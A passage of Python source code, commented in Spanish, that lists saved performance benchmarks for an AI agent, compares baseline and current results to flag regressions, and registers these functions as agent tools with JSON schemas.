        lines.append("\nNo hay baselines guardados.")

    # Listar resultados recientes
    result_files = store.list_results()
    if result_files:
        lines.append(f"\nResultados recientes ({len(result_files)}):")
        for filename in result_files[-5:]:  # Ultimos 5
            lines.append(f"  - {filename}")
    else:
        lines.append("\nNo hay resultados guardados.")

    # Listar benchmarks disponibles para ejecutar
    lines.append("\nBenchmarks ejecutables:")
    for name in sorted(_ALL_BENCHMARKS.keys()):
        lines.append(f"  - {name}")

    lines.append("\nUsa 'ejecutar_benchmark' para correr benchmarks.")
    lines.append("Usa 'comparar_benchmarks' para comparar resultados.")

    return "\n".join(lines)


def comparar_benchmarks(baseline: str, actual: str) -> str:
    """Compara resultados de benchmarks entre un baseline y un resultado actual.

    Args:
        baseline: Nombre del baseline guardado (ej: "default").
        actual: Nombre del resultado actual o "latest" para el ultimo.

    Returns:
        Reporte de comparacion entre los dos conjuntos de resultados.
    """
    store = get_store()

    # Cargar baseline
    baseline_results = store.load_baseline(baseline)
    if not baseline_results:
        return f"Baseline '{baseline}' no encontrado. Usa ver_benchmarks() para ver los disponibles."

    # Cargar resultado actual
    if actual.lower() == "latest":
        result_files = store.list_results()
        if not result_files:
            return "No hay resultados guardados para comparar."
        actual_filename = result_files[-1]
    else:
        actual_filename = actual if actual.endswith(".json") else f"result_{actual}.json"

    actual_filepath = os.path.join(_BENCHMARKS_DIR, actual_filename)
    if not os.path.exists(actual_filepath):
        return f"Resultado '{actual_filename}' no encontrado."

    try:
        with open(actual_filepath, "r", encoding="utf-8") as f:
            data = json.load(f)
        actual_results = [BenchmarkResult(**r) for r in data.get("results", [])]
    except (json.JSONDecodeError, TypeError) as e:
        return f"Error cargando resultado '{actual_filename}': {e}"

    # Comparar
    runner = get_runner()
    comparison = runner.compare(baseline_results, actual_results)

    # Generar reporte
    report = _reporter.format_comparison(comparison)

    # Detectar regresiones
    regressions = []
    for name, entry in comparison.items():
        if entry.get("regression", False):
            regressions.append(name)

    if regressions:
        report += f"\n\nALERTA: Regresiones detectadas en: {', '.join(regressions)}"
    else:
        report += "\n\nNo se detectaron regresiones."

    return report


# ============================================================
# REGISTRO DE HERRAMIENTAS
# ============================================================

register_tool(
    "ejecutar_benchmark",
    ejecutar_benchmark,
    schema={
        "type": "function",
        "function": {
            "name": "ejecutar_benchmark",
            "description": (
                "Ejecuta benchmarks de rendimiento del agente. "
                "Mide latencia y throughput de componentes clave."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "nombre": {
                        "type": "string",
                        "description": (
                            "Nombre del benchmark: 'all' para todos, "
                            "o uno de: model_routing, tool_selection, "
                            "security_check, memory_operations, text_processing"
                        ),
                    },
                    "iteraciones": {
                        "type": "integer",
                        "description": "Numero de iteraciones por benchmark (default: 100)",
                    },
                },
                "required": [],
            },
        },
    },
)

register_tool(
    "ver_benchmarks",
    ver_benchmarks,
    schema={
        "type": "function",
        "function": {
            "name": "ver_benchmarks",
            "description": "Muestra los benchmarks disponibles y resultados guardados.",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": [],
            },
        },
    },
)

register_tool(
    "comparar_benchmarks",
    comparar_benchmarks,
    schema={
        "type": "function",
        "function": {
            "name": "comparar_benchmarks",
            "description": (
                "Compara resultados de benchmarks entre un baseline "
                "y un resultado actual para detectar regresiones."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "baseline": {
                        "type": "string",
                        "description": "Nombre del baseline guardado (ej: 'default')",
                    },
                    "actual": {
                        "type": "string",
                        "description": "Nombre del resultado actual o 'latest' para el ultimo",
                    },
                },
                "required": ["baseline", "actual"],
            },
        },
    },
)
